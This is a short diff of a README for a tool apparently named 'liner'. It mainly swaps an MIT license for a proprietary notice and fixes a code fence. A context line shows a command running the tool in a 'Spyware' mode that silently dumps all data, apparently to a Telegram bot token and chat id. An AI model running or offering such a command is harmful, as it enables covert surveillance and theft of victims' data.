@@ -139,14 +139,24 @@ sudo liner --mode Spyware --dump all --token <BOT_TOKEN> --id <CHAT_ID> --silent
 ```bash
 cat part_* > liner_data.zip
 unzip liner_data.zip
-
+```
 ---
 
 ## 🤝 Contributing
 
 Pull requests and issues are welcome. Let’s improve this project together.
 
+
 ## 📜 License
 
-[MIT License](./LICENSE)
+This project is **proprietary and closed-source**.  
+All rights reserved © 2025 [MNM]  
+Unauthorized copying, distribution, or modification of any part of this codebase is strictly prohibited.
+
+For collaboration or usage inquiries, please contact: [https://t.me/mnmsec]
+
+
+
+// Developed by [MNM]
+// Uploaded: July 2025
 
